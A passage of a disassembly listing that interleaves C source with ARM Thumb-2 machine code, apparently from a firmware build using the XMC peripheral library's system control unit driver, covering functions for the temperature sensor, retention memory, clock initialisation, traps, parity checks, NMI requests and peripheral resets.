 80010b8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80010bc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80010c0:	607b      	str	r3, [r7, #4]
  }
  
  return ((uint32_t)temperature);
 80010c2:	687b      	ldr	r3, [r7, #4]
}
 80010c4:	4618      	mov	r0, r3
 80010c6:	3708      	adds	r7, #8
 80010c8:	46bd      	mov	sp, r7
 80010ca:	bd80      	pop	{r7, pc}
 80010cc:	50004000 	.word	0x50004000

080010d0 <XMC_SCU_IsTemperatureSensorBusy>:

/* API to know whether Die temperature sensor is busy */
bool XMC_SCU_IsTemperatureSensorBusy(void)
{
 80010d0:	b480      	push	{r7}
 80010d2:	af00      	add	r7, sp, #0
  return ((SCU_GENERAL->DTSSTAT & SCU_GENERAL_DTSSTAT_BUSY_Msk) != 0U);
 80010d4:	4b07      	ldr	r3, [pc, #28]	; (80010f4 <XMC_SCU_IsTemperatureSensorBusy+0x24>)
 80010d6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80010da:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80010de:	2b00      	cmp	r3, #0
 80010e0:	bf14      	ite	ne
 80010e2:	2301      	movne	r3, #1
 80010e4:	2300      	moveq	r3, #0
 80010e6:	b2db      	uxtb	r3, r3
}
 80010e8:	4618      	mov	r0, r3
 80010ea:	46bd      	mov	sp, r7
 80010ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80010f0:	4770      	bx	lr
 80010f2:	bf00      	nop
 80010f4:	50004000 	.word	0x50004000

080010f8 <XMC_SCU_WriteToRetentionMemory>:
}
#endif  

/* API to write into Retention memory in hibernate domain */
void XMC_SCU_WriteToRetentionMemory(uint32_t address, uint32_t data)
{
 80010f8:	b480      	push	{r7}
 80010fa:	b085      	sub	sp, #20
 80010fc:	af00      	add	r7, sp, #0
 80010fe:	6078      	str	r0, [r7, #4]
 8001100:	6039      	str	r1, [r7, #0]
  uint32_t rmacr;
  
  /* Get the address right */  
  rmacr = (uint32_t)((address << SCU_GENERAL_RMACR_ADDR_Pos) & (uint32_t)SCU_GENERAL_RMACR_ADDR_Msk);
 8001102:	687b      	ldr	r3, [r7, #4]
 8001104:	041b      	lsls	r3, r3, #16
 8001106:	f403 2370 	and.w	r3, r3, #983040	; 0xf0000
 800110a:	60fb      	str	r3, [r7, #12]
  
  /* Transfer from RMDATA to Retention memory */
  rmacr |= (uint32_t)(SCU_GENERAL_RMACR_RDWR_Msk);
 800110c:	68fb      	ldr	r3, [r7, #12]
 800110e:	f043 0301 	orr.w	r3, r3, #1
 8001112:	60fb      	str	r3, [r7, #12]
  
  /* Write desired data into RMDATA register */  
  SCU_GENERAL->RMDATA = data;
 8001114:	4a0b      	ldr	r2, [pc, #44]	; (8001144 <XMC_SCU_WriteToRetentionMemory+0x4c>)
 8001116:	683b      	ldr	r3, [r7, #0]
 8001118:	f8c2 30cc 	str.w	r3, [r2, #204]	; 0xcc
  
  /* Write address & direction of transfer into RMACR register */  
  SCU_GENERAL->RMACR = rmacr;
 800111c:	4a09      	ldr	r2, [pc, #36]	; (8001144 <XMC_SCU_WriteToRetentionMemory+0x4c>)
 800111e:	68fb      	ldr	r3, [r7, #12]
 8001120:	f8c2 30c8 	str.w	r3, [r2, #200]	; 0xc8
  
  /* Wait until the update of RMX register in hibernate domain is completed */
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_RMX_Msk)
 8001124:	bf00      	nop
 8001126:	4b07      	ldr	r3, [pc, #28]	; (8001144 <XMC_SCU_WriteToRetentionMemory+0x4c>)
 8001128:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 800112c:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001130:	2b00      	cmp	r3, #0
 8001132:	d1f8      	bne.n	8001126 <XMC_SCU_WriteToRetentionMemory+0x2e>
  {
  }
}
 8001134:	bf00      	nop
 8001136:	bf00      	nop
 8001138:	3714      	adds	r7, #20
 800113a:	46bd      	mov	sp, r7
 800113c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001140:	4770      	bx	lr
 8001142:	bf00      	nop
 8001144:	50004000 	.word	0x50004000

08001148 <XMC_SCU_ReadFromRetentionMemory>:

/* API to read from Retention memory in hibernate domain */
uint32_t XMC_SCU_ReadFromRetentionMemory(uint32_t address)
{
 8001148:	b480      	push	{r7}
 800114a:	b085      	sub	sp, #20
 800114c:	af00      	add	r7, sp, #0
 800114e:	6078      	str	r0, [r7, #4]
  uint32_t rmacr;

  /* Get the address right */  
  rmacr = ((uint32_t)(address << SCU_GENERAL_RMACR_ADDR_Pos) & (uint32_t)SCU_GENERAL_RMACR_ADDR_Msk);
 8001150:	687b      	ldr	r3, [r7, #4]
 8001152:	041b      	lsls	r3, r3, #16
 8001154:	f403 2370 	and.w	r3, r3, #983040	; 0xf0000
 8001158:	60fb      	str	r3, [r7, #12]
  
  /* Transfer from RMDATA to Retention memory */
  rmacr &= ~((uint32_t)(SCU_GENERAL_RMACR_RDWR_Msk));
 800115a:	68fb      	ldr	r3, [r7, #12]
 800115c:	f023 0301 	bic.w	r3, r3, #1
 8001160:	60fb      	str	r3, [r7, #12]
  
  /* Writing an adress & direction of transfer into RMACR register */  
  SCU_GENERAL->RMACR = rmacr;
 8001162:	4a0a      	ldr	r2, [pc, #40]	; (800118c <XMC_SCU_ReadFromRetentionMemory+0x44>)
 8001164:	68fb      	ldr	r3, [r7, #12]
 8001166:	f8c2 30c8 	str.w	r3, [r2, #200]	; 0xc8
  
  /* Wait until the update of RMX register in hibernate domain is completed */
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_RMX_Msk)
 800116a:	bf00      	nop
 800116c:	4b07      	ldr	r3, [pc, #28]	; (800118c <XMC_SCU_ReadFromRetentionMemory+0x44>)
 800116e:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001172:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001176:	2b00      	cmp	r3, #0
 8001178:	d1f8      	bne.n	800116c <XMC_SCU_ReadFromRetentionMemory+0x24>
  {
  }

  return (SCU_GENERAL->RMDATA);
 800117a:	4b04      	ldr	r3, [pc, #16]	; (800118c <XMC_SCU_ReadFromRetentionMemory+0x44>)
 800117c:	f8d3 30cc 	ldr.w	r3, [r3, #204]	; 0xcc
}
 8001180:	4618      	mov	r0, r3
 8001182:	3714      	adds	r7, #20
 8001184:	46bd      	mov	sp, r7
 8001186:	f85d 7b04 	ldr.w	r7, [sp], #4
 800118a:	4770      	bx	lr
 800118c:	50004000 	.word	0x50004000

08001190 <XMC_SCU_CLOCK_Init>:

/* API to initialize the clock tree */
void XMC_SCU_CLOCK_Init(const XMC_SCU_CLOCK_CONFIG_t *const config)
{
 8001190:	b590      	push	{r4, r7, lr}
 8001192:	b085      	sub	sp, #20
 8001194:	af02      	add	r7, sp, #8
 8001196:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("", ((config->fstdby_clksrc == XMC_SCU_HIB_STDBYCLKSRC_OSCULP) && (config->enable_osculp == true)) ||
                 (config->fstdby_clksrc != XMC_SCU_HIB_STDBYCLKSRC_OSCULP));
  XMC_ASSERT("", ((config->syspll_config.clksrc == XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP) &&
                 (config->enable_oschp == true)) || (config->syspll_config.clksrc != XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP));

  XMC_SCU_CLOCK_SetSystemClockSource(XMC_SCU_CLOCK_SYSCLKSRC_OFI);
 8001198:	2000      	movs	r0, #0
 800119a:	f000 faf1 	bl	8001780 <XMC_SCU_CLOCK_SetSystemClockSource>

  XMC_SCU_HIB_EnableHibernateDomain();
 800119e:	f000 fd7f 	bl	8001ca0 <XMC_SCU_HIB_EnableHibernateDomain>

  if (config->enable_osculp == true)
 80011a2:	687b      	ldr	r3, [r7, #4]
 80011a4:	79db      	ldrb	r3, [r3, #7]
 80011a6:	2b00      	cmp	r3, #0
 80011a8:	d00a      	beq.n	80011c0 <XMC_SCU_CLOCK_Init+0x30>
  {
    XMC_SCU_CLOCK_EnableLowPowerOscillator();
 80011aa:	f000 ff77 	bl	800209c <XMC_SCU_CLOCK_EnableLowPowerOscillator>
    while (XMC_SCU_CLOCK_IsLowPowerOscillatorStable() == false);
 80011ae:	bf00      	nop
 80011b0:	f000 ff62 	bl	8002078 <XMC_SCU_CLOCK_IsLowPowerOscillatorStable>
 80011b4:	4603      	mov	r3, r0
 80011b6:	f083 0301 	eor.w	r3, r3, #1
 80011ba:	b2db      	uxtb	r3, r3
 80011bc:	2b00      	cmp	r3, #0
 80011be:	d1f7      	bne.n	80011b0 <XMC_SCU_CLOCK_Init+0x20>
  }
  
  XMC_SCU_HIB_SetStandbyClockSource(config->fstdby_clksrc);  
 80011c0:	687b      	ldr	r3, [r7, #4]
 80011c2:	7a5b      	ldrb	r3, [r3, #9]
 80011c4:	4618      	mov	r0, r3
 80011c6:	f000 fb6f 	bl	80018a8 <XMC_SCU_HIB_SetStandbyClockSource>
  while (XMC_SCU_GetMirrorStatus() != 0)
 80011ca:	bf00      	nop
 80011cc:	f7ff fdd8 	bl	8000d80 <XMC_SCU_GetMirrorStatus>
 80011d0:	4603      	mov	r3, r0
 80011d2:	2b00      	cmp	r3, #0
 80011d4:	d1fa      	bne.n	80011cc <XMC_SCU_CLOCK_Init+0x3c>
  {
    /* Wait until update of the stanby clock source is done in the HIB domain */    
  }

  XMC_SCU_CLOCK_SetBackupClockCalibrationMode(config->calibration_mode);
 80011d6:	687b      	ldr	r3, [r7, #4]
 80011d8:	7a1b      	ldrb	r3, [r3, #8]
 80011da:	4618      	mov	r0, r3
 80011dc:	f000 fd0c 	bl	8001bf8 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode>

  XMC_SCU_CLOCK_SetSystemClockDivider((uint32_t)config->fsys_clkdiv);
 80011e0:	687b      	ldr	r3, [r7, #4]
 80011e2:	7c1b      	ldrb	r3, [r3, #16]
 80011e4:	4618      	mov	r0, r3
 80011e6:	f000 fb7f 	bl	80018e8 <XMC_SCU_CLOCK_SetSystemClockDivider>
  XMC_SCU_CLOCK_SetCpuClockDivider((uint32_t)config->fcpu_clkdiv);
 80011ea:	687b      	ldr	r3, [r7, #4]
 80011ec:	7c5b      	ldrb	r3, [r3, #17]
 80011ee:	4618      	mov	r0, r3
 80011f0:	f000 fba6 	bl	8001940 <XMC_SCU_CLOCK_SetCpuClockDivider>
  XMC_SCU_CLOCK_SetCcuClockDivider((uint32_t)config->fccu_clkdiv);
 80011f4:	687b      	ldr	r3, [r7, #4]
 80011f6:	7c9b      	ldrb	r3, [r3, #18]
 80011f8:	4618      	mov	r0, r3
 80011fa:	f000 fb8b 	bl	8001914 <XMC_SCU_CLOCK_SetCcuClockDivider>
  XMC_SCU_CLOCK_SetPeripheralClockDivider((uint32_t)config->fperipheral_clkdiv);
 80011fe:	687b      	ldr	r3, [r7, #4]
 8001200:	7cdb      	ldrb	r3, [r3, #19]
 8001202:	4618      	mov	r0, r3
 8001204:	f000 fbb2 	bl	800196c <XMC_SCU_CLOCK_SetPeripheralClockDivider>

  if (config->enable_oschp == true)
 8001208:	687b      	ldr	r3, [r7, #4]
 800120a:	799b      	ldrb	r3, [r3, #6]
 800120c:	2b00      	cmp	r3, #0
 800120e:	d00a      	beq.n	8001226 <XMC_SCU_CLOCK_Init+0x96>
  {
    XMC_SCU_CLOCK_EnableHighPerformanceOscillator();
 8001210:	f000 ffd8 	bl	80021c4 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator>
    while(XMC_SCU_CLOCK_IsHighPerformanceOscillatorStable() == false);
 8001214:	bf00      	nop
 8001216:	f000 fffd 	bl	8002214 <XMC_SCU_CLOCK_IsHighPerformanceOscillatorStable>
 800121a:	4603      	mov	r3, r0
 800121c:	f083 0301 	eor.w	r3, r3, #1
 8001220:	b2db      	uxtb	r3, r3
 8001222:	2b00      	cmp	r3, #0
 8001224:	d1f7      	bne.n	8001216 <XMC_SCU_CLOCK_Init+0x86>
  }

  if (config->syspll_config.mode == XMC_SCU_CLOCK_SYSPLL_MODE_DISABLED)
 8001226:	687b      	ldr	r3, [r7, #4]
 8001228:	78db      	ldrb	r3, [r3, #3]
 800122a:	2b00      	cmp	r3, #0
 800122c:	d102      	bne.n	8001234 <XMC_SCU_CLOCK_Init+0xa4>
  {
    XMC_SCU_CLOCK_DisableSystemPll();
 800122e:	f001 f855 	bl	80022dc <XMC_SCU_CLOCK_DisableSystemPll>
 8001232:	e011      	b.n	8001258 <XMC_SCU_CLOCK_Init+0xc8>
  }
  else
  {

    XMC_SCU_CLOCK_EnableSystemPll();
 8001234:	f001 f840 	bl	80022b8 <XMC_SCU_CLOCK_EnableSystemPll>
    XMC_SCU_CLOCK_StartSystemPll(config->syspll_config.clksrc,
 8001238:	687b      	ldr	r3, [r7, #4]
 800123a:	8898      	ldrh	r0, [r3, #4]
 800123c:	687b      	ldr	r3, [r7, #4]
 800123e:	78d9      	ldrb	r1, [r3, #3]
                                 config->syspll_config.mode,
                                 (uint32_t)config->syspll_config.p_div,
 8001240:	687b      	ldr	r3, [r7, #4]
 8001242:	785b      	ldrb	r3, [r3, #1]
    XMC_SCU_CLOCK_StartSystemPll(config->syspll_config.clksrc,
 8001244:	461a      	mov	r2, r3
                                 (uint32_t)config->syspll_config.n_div,
 8001246:	687b      	ldr	r3, [r7, #4]
 8001248:	781b      	ldrb	r3, [r3, #0]
    XMC_SCU_CLOCK_StartSystemPll(config->syspll_config.clksrc,
 800124a:	461c      	mov	r4, r3
                                 (uint32_t)config->syspll_config.k_div);
 800124c:	687b      	ldr	r3, [r7, #4]
 800124e:	789b      	ldrb	r3, [r3, #2]
    XMC_SCU_CLOCK_StartSystemPll(config->syspll_config.clksrc,
 8001250:	9300      	str	r3, [sp, #0]
 8001252:	4623      	mov	r3, r4
 8001254:	f001 f854 	bl	8002300 <XMC_SCU_CLOCK_StartSystemPll>
  }

  /* use SYSPLL? */
  if (config->fsys_clksrc == XMC_SCU_CLOCK_SYSCLKSRC_PLL)
 8001258:	687b      	ldr	r3, [r7, #4]
 800125a:	68db      	ldr	r3, [r3, #12]
 800125c:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8001260:	d103      	bne.n	800126a <XMC_SCU_CLOCK_Init+0xda>
  {
    XMC_SCU_CLOCK_SetSystemClockSource(XMC_SCU_CLOCK_SYSCLKSRC_PLL);    
 8001262:	f44f 3080 	mov.w	r0, #65536	; 0x10000
 8001266:	f000 fa8b 	bl	8001780 <XMC_SCU_CLOCK_SetSystemClockSource>
  }
  SystemCoreClockUpdate();
 800126a:	f005 f953 	bl	8006514 <SystemCoreClockUpdate>
}
 800126e:	bf00      	nop
 8001270:	370c      	adds	r7, #12
 8001272:	46bd      	mov	sp, r7
 8001274:	bd90      	pop	{r4, r7, pc}
	...

08001278 <XMC_SCU_TRAP_Enable>:

/* API to enable a trap source */
void XMC_SCU_TRAP_Enable(const uint32_t trap)
{
 8001278:	b480      	push	{r7}
 800127a:	b083      	sub	sp, #12
 800127c:	af00      	add	r7, sp, #0
 800127e:	6078      	str	r0, [r7, #4]
  SCU_TRAP->TRAPDIS &= (uint32_t)~trap;
 8001280:	4b06      	ldr	r3, [pc, #24]	; (800129c <XMC_SCU_TRAP_Enable+0x24>)
 8001282:	689a      	ldr	r2, [r3, #8]
 8001284:	687b      	ldr	r3, [r7, #4]
 8001286:	43db      	mvns	r3, r3
 8001288:	4904      	ldr	r1, [pc, #16]	; (800129c <XMC_SCU_TRAP_Enable+0x24>)
 800128a:	4013      	ands	r3, r2
 800128c:	608b      	str	r3, [r1, #8]
}
 800128e:	bf00      	nop
 8001290:	370c      	adds	r7, #12
 8001292:	46bd      	mov	sp, r7
 8001294:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001298:	4770      	bx	lr
 800129a:	bf00      	nop
 800129c:	50004160 	.word	0x50004160

080012a0 <XMC_SCU_TRAP_Disable>:

/* API to disable a trap source */
void XMC_SCU_TRAP_Disable(const uint32_t trap)
{
 80012a0:	b480      	push	{r7}
 80012a2:	b083      	sub	sp, #12
 80012a4:	af00      	add	r7, sp, #0
 80012a6:	6078      	str	r0, [r7, #4]
  SCU_TRAP->TRAPDIS |= (uint32_t)trap;
 80012a8:	4b05      	ldr	r3, [pc, #20]	; (80012c0 <XMC_SCU_TRAP_Disable+0x20>)
 80012aa:	689a      	ldr	r2, [r3, #8]
 80012ac:	4904      	ldr	r1, [pc, #16]	; (80012c0 <XMC_SCU_TRAP_Disable+0x20>)
 80012ae:	687b      	ldr	r3, [r7, #4]
 80012b0:	4313      	orrs	r3, r2
 80012b2:	608b      	str	r3, [r1, #8]
}
 80012b4:	bf00      	nop
 80012b6:	370c      	adds	r7, #12
 80012b8:	46bd      	mov	sp, r7
 80012ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012be:	4770      	bx	lr
 80012c0:	50004160 	.word	0x50004160

080012c4 <XMC_SCU_TRAP_GetStatus>:

/* API to determine if a trap source has generated event */
uint32_t XMC_SCU_TRAP_GetStatus(void)
{
 80012c4:	b480      	push	{r7}
 80012c6:	af00      	add	r7, sp, #0
  return (SCU_TRAP->TRAPRAW);
 80012c8:	4b03      	ldr	r3, [pc, #12]	; (80012d8 <XMC_SCU_TRAP_GetStatus+0x14>)
 80012ca:	685b      	ldr	r3, [r3, #4]
}
 80012cc:	4618      	mov	r0, r3
 80012ce:	46bd      	mov	sp, r7
 80012d0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012d4:	4770      	bx	lr
 80012d6:	bf00      	nop
 80012d8:	50004160 	.word	0x50004160

080012dc <XMC_SCU_TRAP_Trigger>:

/* API to manually trigger a trap event */
void XMC_SCU_TRAP_Trigger(const uint32_t trap)
{
 80012dc:	b480      	push	{r7}
 80012de:	b083      	sub	sp, #12
 80012e0:	af00      	add	r7, sp, #0
 80012e2:	6078      	str	r0, [r7, #4]
  SCU_TRAP->TRAPSET = (uint32_t)trap;
 80012e4:	4a04      	ldr	r2, [pc, #16]	; (80012f8 <XMC_SCU_TRAP_Trigger+0x1c>)
 80012e6:	687b      	ldr	r3, [r7, #4]
 80012e8:	6113      	str	r3, [r2, #16]
}
 80012ea:	bf00      	nop
 80012ec:	370c      	adds	r7, #12
 80012ee:	46bd      	mov	sp, r7
 80012f0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012f4:	4770      	bx	lr
 80012f6:	bf00      	nop
 80012f8:	50004160 	.word	0x50004160

080012fc <XMC_SCU_TRAP_ClearStatus>:

/* API to clear a trap event */
void XMC_SCU_TRAP_ClearStatus(const uint32_t trap)
{
 80012fc:	b480      	push	{r7}
 80012fe:	b083      	sub	sp, #12
 8001300:	af00      	add	r7, sp, #0
 8001302:	6078      	str	r0, [r7, #4]
  SCU_TRAP->TRAPCLR = (uint32_t)trap;
 8001304:	4a04      	ldr	r2, [pc, #16]	; (8001318 <XMC_SCU_TRAP_ClearStatus+0x1c>)
 8001306:	687b      	ldr	r3, [r7, #4]
 8001308:	60d3      	str	r3, [r2, #12]
}
 800130a:	bf00      	nop
 800130c:	370c      	adds	r7, #12
 800130e:	46bd      	mov	sp, r7
 8001310:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001314:	4770      	bx	lr
 8001316:	bf00      	nop
 8001318:	50004160 	.word	0x50004160

0800131c <XMC_SCU_PARITY_ClearStatus>:

/* API to clear parity error event */
void XMC_SCU_PARITY_ClearStatus(const uint32_t memory)
{
 800131c:	b480      	push	{r7}
 800131e:	b083      	sub	sp, #12
 8001320:	af00      	add	r7, sp, #0
 8001322:	6078      	str	r0, [r7, #4]
  SCU_PARITY->PEFLAG |= (uint32_t)memory; 
 8001324:	4b05      	ldr	r3, [pc, #20]	; (800133c <XMC_SCU_PARITY_ClearStatus+0x20>)
 8001326:	695a      	ldr	r2, [r3, #20]
 8001328:	4904      	ldr	r1, [pc, #16]	; (800133c <XMC_SCU_PARITY_ClearStatus+0x20>)
 800132a:	687b      	ldr	r3, [r7, #4]
 800132c:	4313      	orrs	r3, r2
 800132e:	614b      	str	r3, [r1, #20]
}
 8001330:	bf00      	nop
 8001332:	370c      	adds	r7, #12
 8001334:	46bd      	mov	sp, r7
 8001336:	f85d 7b04 	ldr.w	r7, [sp], #4
 800133a:	4770      	bx	lr
 800133c:	5000413c 	.word	0x5000413c

08001340 <XMC_SCU_PARITY_GetStatus>:

/* API to determine if the specified parity error has occured or not */
uint32_t XMC_SCU_PARITY_GetStatus(void)
{
 8001340:	b480      	push	{r7}
 8001342:	af00      	add	r7, sp, #0
  return (SCU_PARITY->PEFLAG);
 8001344:	4b03      	ldr	r3, [pc, #12]	; (8001354 <XMC_SCU_PARITY_GetStatus+0x14>)
 8001346:	695b      	ldr	r3, [r3, #20]
} 
 8001348:	4618      	mov	r0, r3
 800134a:	46bd      	mov	sp, r7
 800134c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001350:	4770      	bx	lr
 8001352:	bf00      	nop
 8001354:	5000413c 	.word	0x5000413c

08001358 <XMC_SCU_PARITY_Enable>:

/* API to enable parity error checking for the selected on-chip RAM type */
void XMC_SCU_PARITY_Enable(const uint32_t memory)
{
 8001358:	b480      	push	{r7}
 800135a:	b083      	sub	sp, #12
 800135c:	af00      	add	r7, sp, #0
 800135e:	6078      	str	r0, [r7, #4]
  SCU_PARITY->PEEN |= (uint32_t)memory; 
 8001360:	4b05      	ldr	r3, [pc, #20]	; (8001378 <XMC_SCU_PARITY_Enable+0x20>)
 8001362:	681a      	ldr	r2, [r3, #0]
 8001364:	4904      	ldr	r1, [pc, #16]	; (8001378 <XMC_SCU_PARITY_Enable+0x20>)
 8001366:	687b      	ldr	r3, [r7, #4]
 8001368:	4313      	orrs	r3, r2
 800136a:	600b      	str	r3, [r1, #0]
}
 800136c:	bf00      	nop
 800136e:	370c      	adds	r7, #12
 8001370:	46bd      	mov	sp, r7
 8001372:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001376:	4770      	bx	lr
 8001378:	5000413c 	.word	0x5000413c

0800137c <XMC_SCU_PARITY_Disable>:

/* API to disable parity error checking for the selected on-chip RAM type */
void XMC_SCU_PARITY_Disable(const uint32_t memory)
{
 800137c:	b480      	push	{r7}
 800137e:	b083      	sub	sp, #12
 8001380:	af00      	add	r7, sp, #0
 8001382:	6078      	str	r0, [r7, #4]
  SCU_PARITY->PEEN &= (uint32_t)~memory; 
 8001384:	4b06      	ldr	r3, [pc, #24]	; (80013a0 <XMC_SCU_PARITY_Disable+0x24>)
 8001386:	681a      	ldr	r2, [r3, #0]
 8001388:	687b      	ldr	r3, [r7, #4]
 800138a:	43db      	mvns	r3, r3
 800138c:	4904      	ldr	r1, [pc, #16]	; (80013a0 <XMC_SCU_PARITY_Disable+0x24>)
 800138e:	4013      	ands	r3, r2
 8001390:	600b      	str	r3, [r1, #0]
}
 8001392:	bf00      	nop
 8001394:	370c      	adds	r7, #12
 8001396:	46bd      	mov	sp, r7
 8001398:	f85d 7b04 	ldr.w	r7, [sp], #4
 800139c:	4770      	bx	lr
 800139e:	bf00      	nop
 80013a0:	5000413c 	.word	0x5000413c

080013a4 <XMC_SCU_PARITY_EnableTrapGeneration>:

/* API to enable trap assertion for the parity error source */
void XMC_SCU_PARITY_EnableTrapGeneration(const uint32_t memory)
{
 80013a4:	b480      	push	{r7}
 80013a6:	b083      	sub	sp, #12
 80013a8:	af00      	add	r7, sp, #0
 80013aa:	6078      	str	r0, [r7, #4]
  SCU_PARITY->PETE |= (uint32_t)memory; 
 80013ac:	4b05      	ldr	r3, [pc, #20]	; (80013c4 <XMC_SCU_PARITY_EnableTrapGeneration+0x20>)
 80013ae:	689a      	ldr	r2, [r3, #8]
 80013b0:	4904      	ldr	r1, [pc, #16]	; (80013c4 <XMC_SCU_PARITY_EnableTrapGeneration+0x20>)
 80013b2:	687b      	ldr	r3, [r7, #4]
 80013b4:	4313      	orrs	r3, r2
 80013b6:	608b      	str	r3, [r1, #8]
}
 80013b8:	bf00      	nop
 80013ba:	370c      	adds	r7, #12
 80013bc:	46bd      	mov	sp, r7
 80013be:	f85d 7b04 	ldr.w	r7, [sp], #4
 80013c2:	4770      	bx	lr
 80013c4:	5000413c 	.word	0x5000413c

080013c8 <XMC_SCU_PARITY_DisableTrapGeneration>:

/* API to disable the assertion of trap for the parity error source */
void XMC_SCU_PARITY_DisableTrapGeneration(const uint32_t memory)
{
 80013c8:	b480      	push	{r7}
 80013ca:	b083      	sub	sp, #12
 80013cc:	af00      	add	r7, sp, #0
 80013ce:	6078      	str	r0, [r7, #4]
  SCU_PARITY->PETE &= (uint32_t)~memory; 
 80013d0:	4b06      	ldr	r3, [pc, #24]	; (80013ec <XMC_SCU_PARITY_DisableTrapGeneration+0x24>)
 80013d2:	689a      	ldr	r2, [r3, #8]
 80013d4:	687b      	ldr	r3, [r7, #4]
 80013d6:	43db      	mvns	r3, r3
 80013d8:	4904      	ldr	r1, [pc, #16]	; (80013ec <XMC_SCU_PARITY_DisableTrapGeneration+0x24>)
 80013da:	4013      	ands	r3, r2
 80013dc:	608b      	str	r3, [r1, #8]
}
 80013de:	bf00      	nop
 80013e0:	370c      	adds	r7, #12
 80013e2:	46bd      	mov	sp, r7
 80013e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80013e8:	4770      	bx	lr
 80013ea:	bf00      	nop
 80013ec:	5000413c 	.word	0x5000413c

080013f0 <XMC_SCU_INTERRUPT_EnableNmiRequest>:

/* Enables a NMI source */
void XMC_SCU_INTERRUPT_EnableNmiRequest(const uint32_t request)
{
 80013f0:	b480      	push	{r7}
 80013f2:	b083      	sub	sp, #12
 80013f4:	af00      	add	r7, sp, #0
 80013f6:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->NMIREQEN |= (uint32_t)request;
 80013f8:	4b05      	ldr	r3, [pc, #20]	; (8001410 <XMC_SCU_INTERRUPT_EnableNmiRequest+0x20>)
 80013fa:	695a      	ldr	r2, [r3, #20]
 80013fc:	4904      	ldr	r1, [pc, #16]	; (8001410 <XMC_SCU_INTERRUPT_EnableNmiRequest+0x20>)
 80013fe:	687b      	ldr	r3, [r7, #4]
 8001400:	4313      	orrs	r3, r2
 8001402:	614b      	str	r3, [r1, #20]
}
 8001404:	bf00      	nop
 8001406:	370c      	adds	r7, #12
 8001408:	46bd      	mov	sp, r7
 800140a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800140e:	4770      	bx	lr
 8001410:	50004074 	.word	0x50004074

08001414 <XMC_SCU_INTERRUPT_DisableNmiRequest>:

/* Disables a NMI source */
void XMC_SCU_INTERRUPT_DisableNmiRequest(const uint32_t request)
{
 8001414:	b480      	push	{r7}
 8001416:	b083      	sub	sp, #12
 8001418:	af00      	add	r7, sp, #0
 800141a:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->NMIREQEN &= (uint32_t)~request;
 800141c:	4b06      	ldr	r3, [pc, #24]	; (8001438 <XMC_SCU_INTERRUPT_DisableNmiRequest+0x24>)
 800141e:	695a      	ldr	r2, [r3, #20]
 8001420:	687b      	ldr	r3, [r7, #4]
 8001422:	43db      	mvns	r3, r3
 8001424:	4904      	ldr	r1, [pc, #16]	; (8001438 <XMC_SCU_INTERRUPT_DisableNmiRequest+0x24>)
 8001426:	4013      	ands	r3, r2
 8001428:	614b      	str	r3, [r1, #20]
}
 800142a:	bf00      	nop
 800142c:	370c      	adds	r7, #12
 800142e:	46bd      	mov	sp, r7
 8001430:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001434:	4770      	bx	lr
 8001436:	bf00      	nop
 8001438:	50004074 	.word	0x50004074

0800143c <XMC_SCU_RESET_AssertPeripheralReset>:

/* API to manually assert a reset request */
void XMC_SCU_RESET_AssertPeripheralReset(const XMC_SCU_PERIPHERAL_RESET_t peripheral)
{
 800143c:	b480      	push	{r7}
 800143e:	b085      	sub	sp, #20
 8001440:	af00      	add	r7, sp, #0
 8001442:	6078      	str	r0, [r7, #4]
  uint32_t index = (uint32_t)((((uint32_t)peripheral) & 0xf0000000UL) >> 28UL);
 8001444:	687b      	ldr	r3, [r7, #4]
 8001446:	0f1b      	lsrs	r3, r3, #28
 8001448:	60fb      	str	r3, [r7, #12]
  uint32_t mask = (((uint32_t)peripheral) & ((uint32_t)~0xf0000000UL));
 800144a:	687b      	ldr	r3, [r7, #4]
 800144c:	f023 4370 	bic.w	r3, r3, #4026531840	; 0xf0000000
 8001450:	60bb      	str	r3, [r7, #8]

  *(uint32_t *)(&(SCU_RESET->PRSET0) + (index * 3U)) = (uint32_t)mask;
 8001452:	68fa      	ldr	r2, [r7, #12]
 8001454:	4613      	mov	r3, r2
 8001456:	005b      	lsls	r3, r3, #1
 8001458:	4413      	add	r3, r2
 800145a:	009b      	lsls	r3, r3, #2
 800145c:	461a      	mov	r2, r3
 800145e:	4b05      	ldr	r3, [pc, #20]	; (8001474 <XMC_SCU_RESET_AssertPeripheralReset+0x38>)
 8001460:	4413      	add	r3, r2
 8001462:	68ba      	ldr	r2, [r7, #8]
 8001464:	601a      	str	r2, [r3, #0]
}
 8001466:	bf00      	nop
 8001468:	3714      	adds	r7, #20
 800146a:	46bd      	mov	sp, r7
 800146c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001470:	4770      	bx	lr
 8001472:	bf00      	nop
 8001474:	50004410 	.word	0x50004410

08001478 <XMC_SCU_RESET_DeassertPeripheralReset>:

/* API to manually de-assert a reset request */
void XMC_SCU_RESET_DeassertPeripheralReset(const XMC_SCU_PERIPHERAL_RESET_t peripheral)
{
 8001478:	b480      	push	{r7}
 800147a:	b085      	sub	sp, #20
